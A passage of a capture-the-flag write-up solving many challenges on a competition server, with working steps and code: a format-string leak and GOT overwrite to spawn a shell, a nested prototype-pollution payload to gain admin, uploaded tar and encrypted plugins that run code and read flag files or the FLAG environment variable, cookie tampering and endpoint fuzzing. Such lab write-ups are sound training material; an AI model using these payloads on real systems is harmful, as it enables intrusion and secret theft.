        except Exception:
            continue
        if isinstance(out, str) and 'CTF{' in out:
            flag = out
            print('k1,k2 =', k1, k2)
            print(out)
            raise SystemExit
PY
```

- CTF{2944cec0c0f401a5fa538933a2f6210c279fbfc8548ca8ab912b493d03d2f5bf}

### sigdance

- I opened the challenge and did the obvious first step: poke it with netcat.

```
┌──(kali㉿kali)-[~/Desktop]
└─$ nc ctf.ac.upt.ro 9347
Hello from pid8 = 11
ls
nope
id
nope
```

- The binary wasn’t a shell at all—it just printed “Hello from pid8 = <number>” and then waited for input. That “pid8” hint smelled like (getpid() & 255), so I pulled the provided source and took a quick look. The check boiled down to something like:

```
(A<<16) ^ (U<<8) ^ (PID & 255)
```

- where A was a SIGALRM counter and U a SIGUSR1 counter. So the plan: compute the token and send it. For pid8 = 11 I tried the straight guess:

```
└─$ nc ctf.ac.upt.ro 9347
Hello from pid8 = 11
0x6f0d0b
```

- …“nope.” New connection, new run:

```
└─$ nc ctf.ac.upt.ro 9347
Hello from pid8 = 14
0x6f0d0e
nope
```

- Same with 17:

```
└─$ nc ctf.ac.upt.ro 9347
Hello from pid8 = 17
0x6f0d11
nope
```

- At this point I realized the important part: each connection spawns a fresh process, so pid8 keeps changing. I needed to read the banner and then try guesses on the same socket. I also suspected the signal counts could drift, so I prepared a tiny window around the “expected” A≈111, U≈13 and sent them one by one:

```
0x6f0dXX  # exact
0x6e0dXX  # A-1
0x700dXX  # A+1
0x6f0cXX  # U-1
0x6f0eXX  # U+1
…
```

- It still said “nope” for a few PIDs (20, 23). So I widened the window with a simple brute, but crucially kept it on ONE connection:

```
┌──(kali㉿kali)-[~/Desktop]
└─$ PID8=20
( sleep 0.3
  for A in {100..130}; do
    for U in {8..20}; do
      printf "0x%06x\n" $(( (A<<16) ^ (U<<8) ^ PID8  ))
    done
  done
) | nc ctf.ac.upt.ro 9347
```

- That turned out to reconnect (whoops), which changed pid8 mid-stream. Lesson: keep a persistent socket. I wrote a quick Python helper locally, but Windows got fussy:

```
[Running] python -u "c:\Users\User\Downloads\coperta\coperta.py"
[+] pid8 = 29
ConnectionAbortedError: [WinError 10053] An established connection was aborted by the software in your host machine
```

- So I went back to Kali where netcat behaved. New session:

```
└─$ nc ctf.ac.upt.ro 9347
Hello from pid8 = 38
```

- I tried the usual window again:

```
0x6f0d26
0x6e0d26
0x700d26
0x6f0c26
0x6f0e26
0x6e0c26
0x6e0e26
0x700c26
0x700e26
nope
nope
nope
nope
nope
nope
nope
nope
nope
```

-At this point I suspected the timers were barely firing (container jitter). I tested tiny counters on the SAME connection, keeping the banner’s pid8=0x26 in mind:

```
0x26        # A=0, U=0
0x0d26      # A=0, U=13
0x6f0026    # A=111, U=0
0x6f0d26    # A=111, U=13
0x000126    # A=0, U=1
0x010026    # A=1, U=0
```

- And there it was—the service answered with the flag right after those tiny guesses:

- CTF{cbc4e1be639219dad8912bb764b566200023e15152635eef87be047c41bd995a}

- In the end, the trick wasn’t fancy math; it was simply staying on one connection so pid8 didn’t change, and being flexible about A and U. On this box they were tiny (one or zero ticks), so the low-token guesses hit immediately.

### holiday_trip
- We get a picture with some mugs.
- The first mugs spell Golden Sands.
<img width="1147" height="1147" alt="goldensands" src="https://cdn.discordapp.com/attachments/1416169229652328599/1418261653870350386/Screenshot_18-Sep_15-45-03_11405.png?ex=68cd7a98&is=68cc2918&hm=7f8eff690df377c2e3a990bab4b5c930f438282c366cc9e60d31e43ba4bc0cd3&" />
- CTF{Golden_Sands}

### fini
- FINI — tiny pwn (format-leak + 8‑byte write)

- I opened the service and tried to talk to it like a normal user.

```
nc ctf.ac.upt.ro 9849
```

- It greeted me with “What’s your name?” and a tiny menu after that. My first instinct was to see if the greeting was a raw printf. I sent a short positional format string (short on purpose—long %p chains crash the greeting).

```
%15$p %25$p %35$p %45$p %55$p
```

- Bingo: it printed a handful of pointers and one of them started with 0x55/0x56 and ended with 1290. That usually means “you leaked _start from the PIE.” In one of my runs I got:

```
Hello, (nil) 0x1 0x… 0x7ffc178f7fd8 0x55de88911290
```

- From there I kept the math simple and *in the same connection* (ASLR means I never reuse numbers across sessions). For this challenge the useful offsets were stable:

```
- _start = 0x1290
- win    = 0x1380  → win = L + 0x00F0
- exit@GOT ≈ 0x3420 → exit = L + 0x2190   (fallback: L + 0x2180)
```

- I didn’t bother computing the whole base; I just used the leak (call it L) and added the small deltas. Example with the leak above:
```
L = 0x55de88911290
exit = L + 0x2190 = 0x55de88913420
win  = L + 0x00F0 = 0x55de88911380
```

- If I wanted a calculator in the terminal, I used this one‑liner:

```
    python3 - <<'PY'
    L=int(input().strip(),16)
    print("exit =",hex(L+0x2190))
    print("win  =",hex(L+0xF0))
    PY
    # paste the leak like: 0x55de88911290
```

- With the two numbers ready, I used the built‑in write primitive from the menu:

```
1
Addr (hex): 0x55de88913420
Value (hex, 8 bytes): 0x55de88911380
ok
2
```

- That “2” triggers exit, which now jumps to win, which runs /bin/sh. I usually check quickly:

```
    id
    ls
    cat flag*
```

- Example : 

```
    nc ctf.ac.upt.ro 9910
    %15$p %25$p %35$p %45$p %55$p
    Hello, (nil) 0x1 ... 0x565102fed290
    1
    Addr (hex): 0x565102fef420      # L + 0x2190
    Value (hex, 8 bytes): 0x565102fed380   # L + 0xF0
    ok
    2
    id
    ls
    cat flag.txt
```
- ctf{c503f30375fd0e91985b4d8f0c9cdc234c8018a8b3e1df3f4d1a126725f47d42}

### theme-generator

- I opened the challenge and saw a theme generator with an /admin/flag link that said “admins only.” Looked harmless, so I tried the easiest thing first: log in and keep the cookie.

- Step 1 — quick login

```
HOST="http://ctf.ac.upt.ro:9358"

curl -s -c c.txt -X POST -d 'username=guest&password=guest' "$HOST/login" > /dev/null
curl -b c.txt "$HOST/admin/flag"
```

- Okay, nothing. The UI had “Upload New Preset,” which usually means the server will merge some JSON.

- Step 2

```
I made the classic payload and sent it. It didn’t work — looked like they blocked magic keys at the top level.

cat > pp.json <<'EOF'
{ "__proto__": { "isAdmin": true } }
EOF

curl -s -b c.txt -F 'preset=@pp.json;type=application/json'   "$HOST/api/preset/upload" > /dev/null

curl -b c.txt "$HOST/admin/flag"
```

- I also tried a query-string trick in case they used qs, but it didn’t flip anything because nothing merged it globally.

```
curl -s -b c.txt "$HOST/?constructor.prototype.isAdmin=true" > /dev/null
curl -b c.txt "$HOST/admin/flag"
```

- Step 3

- Maybe the file field wasn’t “preset.” I brute-guessed a few common ones. Still no flag.

```
for fld in preset file theme config upload; do
  curl -s -b c.txt -F "$fld=@pp.json;type=application/json"     "$HOST/api/preset/upload" > /dev/null
done
```

- Step 4 — the tweak that worked (nested path)

- I figured the blocker only checked the first level. Deep merges like to walk into constructor.prototype, so I hid my write there. New payload:

```
cat > pp2.json <<'EOF'
{
  "theme": {
    "constructor": {
      "prototype": { "isAdmin": true }
    }
  }
}
EOF
```

- Then I retried the upload (same endpoint, “preset” field).

```
curl -s -b c.txt -F 'preset=@pp2.json;type=application/json'   "$HOST/api/preset/upload" > /dev/null
```

- On the first port it still said “admins only,” so I moved to the fresh instance they gave us and replayed the steps.

- Step 5 — new instance, same idea, flag

```
HOST="http://ctf.ac.upt.ro:9133"

curl -s -c c.txt -X POST -d 'username=guest&password=guest' "$HOST/login" > /dev/null

cat > pp.json <<'EOF'
{
  "theme": {
    "constructor": {
      "prototype": { "isAdmin": true }
    }
  }
}
EOF

# try a few likely endpoints/fields, then pull the flag
endpoints=(/api/preset/upload /api/upload /upload /api/theme/upload /api/import)
fields=(preset file theme config upload data)
for ep in "${endpoints[@]}"; do
  for fld in "${fields[@]}"; do
    curl -s -b c.txt -F "$fld=@pp.json;type=application/json" "$HOST$ep" > /dev/null
  done
done

curl -s -b c.txt "$HOST/admin/flag"
```
- ctf{fa82311c2970593b2df929b7d0f1ca6292a9a2d3707057b84a5127ceed38edd6}

- What actually happened: My first payload was blocked at the top level. The nested one let the server’s deep merge walk theme → constructor → prototype and set isAdmin on Object.prototype. After that, req.user.isAdmin looked true everywhere, so /admin/flag gave me the flag.

### octojail

- I opened the challenge and the prompt said: “Send octal.” I tried the obvious just to see what breaks:
```
nc ctf.ac.upt.ro 9939
12345670
# -> timeout
```

- So it clearly wanted something more structured than random digits.

- I grabbed the provided main.py and read it. The code was pretty friendly: it reads a single line of octal, groups every 3 digits into a byte, treats the bytes as a tar archive (gzip also allowed), extracts to uploads/, imports uploads/plugin.py, and calls run(). That meant I could ship my own code inside a tiny tarball—as long as I sent it as octal on one line with a newline at the end.

- First, I fumbled a bit. I built a plain tar (no gzip) and pasted its octal, but I forgot the trailing newline and the server just sat until the alarm hit. Second try I added the newline but still got “bad archive.” Turned out my tar had a zero-length file because I messed up the size field.

- I switched to a small Python one‑liner that does the packing for me and pipes everything to nc. This time I also used gzip to keep it small and safe:

```
    python3 - <<'PY' | nc ctf.ac.upt.ro 9939
    import tarfile, io, sys
    code = b'''def run():
        for p in ('/flag','/flag.txt','flag','flag.txt'):
            try:
                print(open(p,'r').read()); return
            except Exception: pass
        print("no flag found")'''
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tf:
        ti = tarfile.TarInfo('plugin.py')
        ti.size = len(code)
        tf.addfile(ti, io.BytesIO(code))
    data = buf.getvalue()
    sys.stdout.write(''.join(f'{b:03o}' for b in data) + '\\n')
    PY
```
- Small hiccup: my first attempt used f"{b:o}" which drops leading zeros, and the server misparsed the bytes. Padding with %03o fixed it. After that, the server extracted uploads/plugin.py, imported it, and my run() printed the flag straight to my terminal.

- For completeness, here are the tiny tests I ran while debugging the format issues:

```
    # sanity: convert a short byte string to octal triplets
    python3 - <<'PY'
    s=b'OK\\n'
    print(''.join(f'{b:03o}' for b in s))
    PY

    # quick check that gzip tar is valid locally
    python3 - <<'PY'
    import tarfile, io
    from pathlib import Path
    code=b'print(1)'
    buf=io.BytesIO()
    with tarfile.open(fileobj=buf, mode='w:gz') as tf:
        import io as _io, tarfile as _tarfile
        ti=_tarfile.TarInfo('plugin.py'); ti.size=len(code)
        tf.addfile(ti, _io.BytesIO(code))
    buf.seek(0)
    with tarfile.open(fileobj=buf, mode='r:gz') as tf:
        print(tf.getnames())
    PY
```
- Once the octal padding and newline were right, it was smooth: send the gzipped tar as octal, let the jail import my plugin, and collect the flag.


### money

- The landing page was all neon and the big “Insert Coin” box. Two widgets were already there (Sales Chart, Flag), and a locked Store teased me.

- I pulled the source. In server.py I saw uploads had to be .plugin files. The server takes the first 16 bytes as IV, decrypts the rest with AES‑CBC using a hard-coded key, treats the plaintext as a ZIP, extracts it, and (the fun part) executes init.py. That shaped the plan: make a tiny plugin to unlock the Store; if the Store’s flag plugin doesn’t reveal the flag, use my own init.py to grab it from the environment.

- First move: create a minimal plugin. I wrote a small builder that zips index.html + icon + plugin_manifest.json and encrypts it into coin.plugin.

```
--- build_coin_plugin.py ---
import os, json, zipfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from secrets import token_bytes

KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"  # from server.py

os.makedirs("myplugin", exist_ok=True)
open("myplugin/index.html","w").write("<h1>hello vc</h1>")
open("myplugin/icon.png","wb").write(
    b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00"
    b"\x90wS\xde\x00\x00\x00\nIDATx\x9cc``\x00\x00\x00\x02\x00\x01\xe2!\xbc3\x00\x00\x00\x00IEND\xaeB`\x82"
)
json.dump({"name":"Coin","version":"1.0","author":"me","icon":"icon.png"},
          open("myplugin/plugin_manifest.json","w"))

with zipfile.ZipFile("plugin.zip","w",zipfile.ZIP_DEFLATED) as z:
    for n in ["index.html","icon.png","plugin_manifest.json"]:
        z.write(f"myplugin/{n}", arcname=n)

iv = token_bytes(16)
data = open("plugin.zip","rb").read()
ct = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(data,16))
open("coin.plugin","wb").write(iv+ct)
print("coin.plugin ready")
```

- I uploaded coin.plugin via Insert Coin. Third widget appeared, Store unlocked. Nice.

- I grabbed the official flag.plugin and tried the lazy route: decrypt it locally. Here’s the quick decryptor I used.

```
--- decrypt_flag.py ---
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import zipfile

KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"

blob = open("flag.plugin","rb").read()
iv, ct = blob[:16], blob[16:]
pt = unpad(AES.new(KEY, AES.MODE_CBC, iv).decrypt(ct), 16)
open("flag.zip","wb").write(pt)
with zipfile.ZipFile("flag.zip") as z:
    z.extractall("flag_plugin")
print("unzipped to flag_plugin/")
```

- That was a dead end. The extracted plugin had an init.py that reads the flag from the server’s environment (os.getenv("FLAG")). Locally, there’s no flag to find.

- So I pivoted: if their init.py runs on upload, mine can run too. I made a second plugin that writes the env flag to a file the app serves from the widget folder.

```
--- build_steal_plugin.py ---
import os, json, zipfile
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from secrets import token_bytes

KEY = b"SECRET_KEY!123456XXXXXXXXXXXXXXX"

os.makedirs("steal", exist_ok=True)
open("steal/index.html","w").write("<h1>hi</h1>")
open("steal/init.py","w").write(
    "import os, pathlib\n"
    "p = pathlib.Path(__file__).resolve().parent\n"
    "(p/'pwnd.txt').write_text(os.getenv('FLAG','no flag found'))\n"
)
open("steal/icon.png","wb").write(
    b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00"
    b"\x90wS\xde\x00\x00\x00\nIDATx\x9cc``\x00\x00\x00\x02\x00\x01\xe2!\xbc3\x00\x00\x00\x00IEND\xaeB`\x82"
)
json.dump({"name":"Coin","version":"1.0","author":"me","icon":"icon.png"},
          open("steal/plugin_manifest.json","w"))

with zipfile.ZipFile("plugin.zip","w",zipfile.ZIP_DEFLATED) as z:
    for n in ["index.html","init.py","icon.png","plugin_manifest.json"]:
        z.write(f"steal/{n}", arcname=n)

iv = token_bytes(16)
data = open("plugin.zip","rb").read()
ct = AES.new(KEY, AES.MODE_CBC, iv).encrypt(pad(data,16))
open("steal.plugin","wb").write(iv+ct)
print("steal.plugin ready")
```

- I uploaded steal.plugin. The widget card popped up with a /widget/<uid> URL. Appending /pwnd.txt gave me exactly what I wanted:

- /widget/uid/pwnd.txt

- CTF{9fb64c8a4d81f9d0e1f4108467bee58db112d0d1457fa3716cc6a46231803686}

### unknown_traffic1

- I opened the PCAP in Wireshark. Full of HTTP. What I did see: a huge number of ICMP echo requests (pings). That felt suspicious, so I clicked a few. The payloads weren’t the boring zeroes you normally see; they looked like neat little ASCII chunks. base64… maybe?

- I tried Follow → ICMP Stream hoping it would magically show a message. Nope—just tiny fragments. I also poked Export Objects out of habit. Nothing.

- Alright, command line time. I reached for tshark to pull the payloads out in order.

```
tshark -r unknown-traffic1.pcap -Y "icmp.type==8 && data.data"   -T fields -e icmp.seq -e data.data | sort -n -k1,1 | awk '{print $2}' | tr -d '
' | xxd -r -p | base64 -d; echo
```

- ctf{72c8c1090e0bba717671f79de6e941a281e2f51da29865722f98c9fa3b7160e5}

### sss

- Three long hex strings: P1, P2, P3.

- I tossed the shares into Python. First try crashed—one of the strings had an odd number of hex characters (classic paste gremlin). I just padded a trailing 0 when the length was odd and moved on. Then I pulled out the x (2nd byte) and the “body” (the rest), and combined the three bodies with XOR. That gave me a 256-byte blob called SSS_secret.bin.

```
Python used:
P1 = "8010ba0d6e...f79bd12"
P2 = "80264e325a...149a95a"
P3 = "8036f43f34...e44142b"

def fix(h):  # pad if odd count of hex nibbles
    return h if len(h) % 2 == 0 else h + "0"

def parse(h):
    b = bytes.fromhex(fix(h))
    assert b[0] == 0x80
    return b[1], b[2:]  # x, y-bytes

x1,y1 = parse(P1)
x2,y2 = parse(P2)
x3,y3 = parse(P3)

secret = bytes(a ^ b ^ c for a,b,c in zip(y1,y2,y3))
open("SSS_secret.bin","wb").write(secret)
```

Poking the blob
Time for quick reconnaissance:

- quick ID
file SSS_secret.bin

- peek as hex
xxd -g 1 -l 256 SSS_secret.bin | sed -n '1,32p'

- search for ASCII flag
strings -a SSS_secret.bin | grep -iE 'ctf\{|flag\{'

- search for UTF-16LE flag
strings -el SSS_secret.bin | grep -iE 'ctf\{|flag\{'

Nothing obvious. The hex dump had lots of zeros and pairs like 03 90, 06 50, 03 30—looked like each char might be split across two bytes (nibbles). I also tried a quick “reverse 16-bit” scan just in case:
```
python3 - << 'PY'
import struct,re
b=open("SSS_secret.bin","rb").read()
w=list(struct.unpack("<{}H".format(len(b)//2), b))
rb=struct.pack("<{}H".format(len(w)), *w[::-1])
for s in (b.decode("utf-16le","ignore"),
          rb.decode("utf-16le","ignore"),
          b.decode("latin1","ignore")):
    m=re.search(r'(ctf|flag)\{[^}]+\}', s, re.I)
    if m: print(m.group(0))
PY
```
- Still nothing obvious. I printed a base64 for a different angle—it looked like structured data near the end:
```
python3 - << 'PY'
import base64
print(base64.b64encode(open("SSS_secret.bin","rb").read()).decode())
PY
```
- Those byte pairs really felt like nibbles. I split the blob into even/odd bytes, combined the low nibble of the even byte with the high nibble of the odd byte to rebuild characters, then reversed the result. That popped the flag instantly.

- Python used:
```
b = open("SSS_secret.bin","rb").read()
even, odd = b[::2], b[1::2]

# high nibble from even's low 4 bits, low nibble from odd's high 4 bits
ascii_bytes = bytes(((e & 0x0F) << 4) | (o >> 4) for e,o in zip(even, odd))

# the text is reversed
s = ascii_bytes[::-1].decode('ascii', 'ignore')

import re
print(re.search(r'(?:ctf|flag)\{[^}]+\}', s).group(0))
```

- ctf{d6b72529c6177d8f648ae85f624a24d6f1edce5ca29bd7cc0b888e117a123892}

### dot-private-key

- I opened DevTools → Network → I pasted a fake key and hit Check: POST /key with my secret in the payload.

```
HOST=http://ctf.ac.upt.ro:9198
curl -i "$HOST/key"   -H 'Content-Type: application/json'   --data '{"key":"sk_live_TESTC","type":"api"}'
```
- At first I used "type":"API Key" and the server scolded me with Invalid type field. Lowercasing to "api" fixed it. Small stumble, quick fix.

My next instinct was to go flag-hunting the lazy way:

```
curl -i $HOST/flag
curl -i $HOST/flag.txt
curl -i $HOST/robots.txt
```

- All 404s.

- I grabbed the page and assets:

```
curl -s $HOST -o index.html
grep -Eo '(src|href)="[^"]+"' index.html | sed 's/.*="//;s/"$//' | sort -u
# script.js, styles.css

curl -s $HOST/script.js -o script.js
grep -nE 'fetch\(|/key|/lastUpdate' script.js
```

- The JS was tiny—POST /key and a GET /lastUpdate. That felt like a side door had to exist. Instead of unleashing a giant wordlist, I tried a surgical one:

```
cat > endpoints.txt <<'EOF'
dump
export
export.csv
keys
logs
db.json
EOF
```

```
ffuf -w endpoints.txt -u $HOST/FUZZ -mc 200,204,301,302,307,308,401,403
# /dump → 200
```

- That was the moment. I pulled it:

```
curl -s $HOST/dump -o dump.json
```

The file was leaked:

```
grep -Eio 'ctf\{[^}]+\}' dump.json
# ctf{284dc217ce36b9133c561207af3dbf6b8656323d6375f3f5c8c955be0a2aab66}
```

### baofeng

- The file Call.mp3 is available for download.
- It is a radio transmission recording.
- It lacks quality and clarity so I have applied some AI Clarity filter.
- Listening to the audio, I hear CQ CQ CQ this is yankee oscar two tango sierra sierra calling from kilo november 15 kilo sierra. 
- This is the radio alphabet, so, it says YO2TSS, calling from KS15KS
- Searching the location, I see the answer Hunedoara. 
- ctf{YO2TSS_Hunedoara}
    <img width="1920" height="1080" alt="Screenshot_17-Sep_17-59-11_13453" src="https://cdn.discordapp.com/attachments/1416169229652328599/1418207157215559780/IMG_8984.png?ex=68cd47d7&is=68cbf657&hm=e7ad98fcd5c02c3a9a2330cd1d7e5a52f096c55df9c415e9e91fe5200fe83af7&">
### hidden_in_the_cartridge
- This challange was pretty easy. I started by running strings on the .nes file and exported it to a txt file.
```
strings space_invaders.nes >> txt.txt
```
- I instantly thought the long lines of text had to do something with the flag.
- Copy pasted everything in cyberchef and decoded it from hex.
- ctf{9f1b438164dbc8a6249ba5c66fc0d6195b5388beed890680bf616021f2582248}
<img width="1920" height="1080" alt="Screenshot_17-Sep_17-59-11_13453" src="https://github.com/user-attachments/assets/7d0d5067-a257-4d47-8613-878e59aea801" />

### onions2
- At first, it may seem like it's just a picture, but in reality, it hides an onion link.
- That's what I discovered when i ran zsteg.
- t465kjcwuqbpabjeh3za73zkxxlzymattskj2gj3ftkvmm5unnyqrvyd.onion
- Opening the link, I immediately recognise the saying from overclock's bio:)))
- Everything seemed fine, nothing out of the ordinary on the ui, so I opened the source code, which looked relatively fine, the single outlier being the font which was suspicious.
- I downloaded it and ran strings on it.
- Nothing caught my eye, except the reaaallyyyy long final line, which I entered onto cyberchef.
- After several times of using Magic, decrypting from base64, then from hex, from morse code and finally from binary, I see a google maps link.
<img width="1920" height="1080" alt="Screenshot_17-Sep_16-43-29_15717" src="https://github.com/user-attachments/assets/39a0ece4-4714-4348-85c7-f623cf948c0a" />
- Opening it, I look at the picture closely. I see something special.
- Looking at the whole image gallery, I finally discover a QR code.
<img width="1920" height="1080" alt="Screenshot_17-Sep_17-18-48_4287" src="https://github.com/user-attachments/assets/ed155ca9-d0a8-465d-84f1-e310fbea3e34" />
- Scanning it reveales the flag.
- ctf{199a4b2aee1bcab9e885624331f9bd5808a2167c49daa343ca81c44a03d7f4ef}

### random-gallery
- Seeing the login page, I instantly tried some random logins, like admin admin.
- No succes, so I tried an SQL injection, still nothing.
- Checked the Cookie-Editor extension and saw a sessioj and logged_in cookie.
- Changed the logged_in cookie from false to true, and tried my luck navigating to "/gallery".
- Navigated to city>haunts>me and saw a qr code which scanned, gave a pastebin link, linking to the flag.
- https://pastebin.com/9HibccWH > ctf{1cd4daf060aee882653595cca4e719d48a3080cd1b76055812145da8a10b47e1}
<img width="1147" height="1147" alt="not-a-flag" src="https://github.com/user-attachments/assets/a3c0b7b0-42b4-49a0-88c3-f2c860ddbbf3" />

### Discord
- The flag_channel does not actually contain the flag. Analyzing the food recipes will just make you hungry.
- Opening the sticker panel, we are instantly greeted with the CTF@AC Logo, with the qr code visually hidden.
- ![Screenshot_1](https://github.com/user-attachments/assets/611465e0-dc52-44f8-9c13-3046e49a0a8b)
- Vencord (custom discord client) let me instantly get the bigger picture, which I put a grayscale filter over, so that the picture would scan easier.
- ![image](https://github.com/user-attachments/assets/d9f603ef-9f99-4c1d-bda4-697063bf4c27)
- The link redirects you to example.com, but, inside the link, there is a hidden parameter stating the flag.
- ![IMG_8939](https://github.com/user-attachments/assets/a2157a72-41c0-4c3f-991e-0a1ce4893b47)
- ctf{7B9096dbeab272bd4d02ea9a5e0f66568ab274b2096f8be3933a48131f8e4db907}

### disco_dance
- The discord series was my favourite type of challanges.
- They were so well thought and engineered, and actually made me smile.
- Regarding disco_dance, the server sends an encrypted text, which can only be decoded using the contents of the last 5 messages in the "spam" channel.
- ChatGPT and I kinda underengineered it, as the script lacks the ability to automatically fetch the contents using the discord api. 
- This would have helped me get a first blood for the next challange easily.
- Thankfully, my coleague, which I thank a lot, filled the chat with "a" s, which made it impressively easy for me and the script to decode the flag.
- CTF{f55ba4939edd5611a7ab797529b51dae47989b3c5a99f2ffc82e4b2c74d03e56}
- Here is the script I used:

```
#!/usr/bin/env python3
"""
Conectează-te la host:port, citește JSON-ul returnat (o linie) cu cheia 'encrypted',
construiește seed = "a" repetat de 5 ori, derivează SHA256(seed) -> AES key,
decodează base64(iv + ciphertext) și decriptează AES-CBC + PKCS7 unpad -> afișează flag.
"""

import sys
import socket
import json
import base64
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import unpad

def derive_key_from_seed(seed: bytes) -> bytes:
    h = SHA256.new()
    h.update(seed)
    return h.digest()

def decrypt_blob_b64(encrypted_b64: str, seed_bytes: bytes) -> bytes:
    raw = base64.b64decode(encrypted_b64)
    if len(raw) < 16:
        raise ValueError("Blob prea scurt (nu exista IV + ciphertext).")
    iv = raw[:16]
    ct = raw[16:]
    key = derive_key_from_seed(seed_bytes)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt_padded = cipher.decrypt(ct)
    try:
        pt = unpad(pt_padded, AES.block_size)
    except ValueError as e:
        raise ValueError("Eroare la unpad (cheie/seed greșit sau ciphertext corupt).") from e
    return pt

def recv_line(sock: socket.socket, timeout: float = 5.0) -> str:
    sock.settimeout(timeout)
    buf = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
        if b"\n" in buf:
            break
    return buf.decode(errors="replace").strip()

def main():
    if len(sys.argv) < 2:
        print("Usage: python disco_dance.py <HOST> [PORT]")
        sys.exit(2)
    host = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) >= 3 else 5000

    # seed = concatenarea celor 5 mesaje "a"
    seed_string = "a" * 5  # "aaaaa"
    seed_bytes = seed_string.encode("utf-8")

    try:
        with socket.create_connection((host, port), timeout=8) as s:
            # primim o linie (JSON) de la server
            data_line = recv_line(s, timeout=6.0)
    except Exception as e:
        print(f"Conexiune esuata: {e}")
        sys.exit(1)

    if not data_line:
        print("Nu am primit niciun raspuns de la server.")
        sys.exit(1)

    # încercăm să parsăm JSON; server trimite string reprezentare dict ('{'encrypted': '...'}')
    encrypted_b64 = None
    try:
        parsed = json.loads(data_line)
        if isinstance(parsed, dict) and "encrypted" in parsed:
            encrypted_b64 = parsed["encrypted"]
    except Exception:
        alt = data_line.strip()
        try:
            alt_json = alt.replace("'", '"')
            parsed = json.loads(alt_json)
            if isinstance(parsed, dict) and "encrypted" in parsed:
                encrypted_b64 = parsed["encrypted"]
        except Exception:
            try:
                if "encrypted" in data_line:
                    idx = data_line.find("encrypted")
                    sub = data_line[idx:]
                    for q in ("'", '"'):
                        p1 = sub.find(q)
                        if p1 != -1:
                            p2 = sub.find(q, p1+1)
                            if p2 != -1:
                                encrypted_b64 = sub[p1+1:p2]
                                break
            except Exception:
                encrypted_b64 = None

    if not encrypted_b64:
        print("Nu am reușit să extrag câmpul 'encrypted' din răspunsul serverului.")
        print("Răspuns brut primit:")
        print(data_line)
        sys.exit(1)

    print("Encrypted (base64):", encrypted_b64)
    print("Folosesc seed (5x 'a'):", repr(seed_string))

    try:
        plaintext = decrypt_blob_b64(encrypted_b64, seed_bytes)
    except Exception as e:
        print("Eroare la decriptare:", e)
        sys.exit(1)

    print("\n== Decrypted plaintext (bytes) ==")
    print(plaintext)
    print("\n== Decrypted plaintext (utf-8 if decodable) ==")
    try:
        print(plaintext.decode("utf-8"))
    except Exception:
        print("<cannot decode as utf-8>")

if __name__ == "__main__":
    main()
```

### disco_rave
- Another congrats to the organisers and challange writers, as this one was my favourite.
- It took me a while to find the bug in my code, which caused error 401 Unauthorized when trying to fetch data using the discord api.
- The challange works relatively the same. This time, it fetches the last messages ("content" and "timestamp") from the both spam channels. 
- This time, using an automatically message fetcher was necessary, as the whole chat was going crazy, and getting the exact timestamp manually would take too long. Even longer than actually making an automatic message fetcher.
- Long story short, using a similar script, this time automatically fetching every piece of information needed, I instantly got the flag.
- CTF{a83a34f8791905a4edd6e03beefeddc1c7eeeeeacf9d96af6d1e3c34494df4cc}
```
#!/usr/bin/env python3

import os
import sys
import json
import argparse
import time
import base64
import socket
import requests
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

# Channels (în aceeași ordine ca serverul)
CHANNELS = [
    "1416908413375479891",
    "1417154025371209852",
]

DISCORD_API_BASE = "https://discord.com/api/v10"

def fetch_messages_channel(token: str, channel_id: str, limit: int = 10, retry: int = 3, backoff: float = 1.0):
    """
    Returnează lista de mesaje (JSON list) pentru channel_id în ordinea returnată de API (newest->oldest).
    """
    url = f"{DISCORD_API_BASE}/channels/{channel_id}/messages"
    headers = {"Authorization": f"{token}"}
    params = {"limit": limit}
    for attempt in range(1, retry + 1):
        try:
            r = requests.get(url, headers=headers, params=params, timeout=10)
            r.raise_for_status()
            data = r.json()
            if not isinstance(data, list):
                raise RuntimeError("Unexpected response shape: not a list")
            return data
        except requests.HTTPError as e:
            status = getattr(e.response, "status_code", None)
            if status == 429:
                try:
                    j = e.response.json()
                    wait = j.get("retry_after", backoff)
                    # retry_after might be seconds (float)
                except Exception:
                    wait = backoff
                time.sleep(wait if isinstance(wait, (int, float)) else backoff)
                continue
            # for 401/403 -> stop and raise
            raise
        except Exception as e:
            if attempt < retry:
                time.sleep(backoff * attempt)
                continue
            raise

def build_seed_from_channels(token: str, channels, limit: int = 10):
    """
    Construiește seed-ul EXACT ca serverul: pentru fiecare canal (în lista channels),
    ia mesajele returnate de API (în ordinea API), pentru fiecare msg concatenează content + timestamp,
    apoi concatenează toate acestea (mai întâi toate din channel1, apoi channel2).
    Returnează seed în bytes (utf-8).
    """
    parts = []
    for ch in channels:
        msgs = fetch_messages_channel(token, ch, limit=limit)
        # păstrăm ordinea exactă a listei returnate de API
        for m in msgs:
            content = m.get("content", "") or ""
            timestamp = m.get("timestamp", "") or ""
            parts.append(f"{content}{timestamp}")
    concatenated = "".join(parts)
    return concatenated.encode("utf-8"), parts  # returnăm și lista pentru debugging

def derive_key_from_seed(seed_bytes: bytes):
    h = SHA256.new()
    h.update(seed_bytes)
    return h.digest()

def decrypt_blob_b64(encrypted_b64: str, seed_bytes: bytes):
    raw = base64.b64decode(encrypted_b64)
    if len(raw) < 16:
        raise ValueError("Encrypted blob prea scurt (IV + ciphertext lipsește).")
    iv = raw[:16]
    ct = raw[16:]
    key = derive_key_from_seed(seed_bytes)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt_padded = cipher.decrypt(ct)
    pt = unpad(pt_padded, AES.block_size)
    return pt

def recv_line(sock: socket.socket, timeout: float = 6.0) -> str:
    sock.settimeout(timeout)
    buf = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
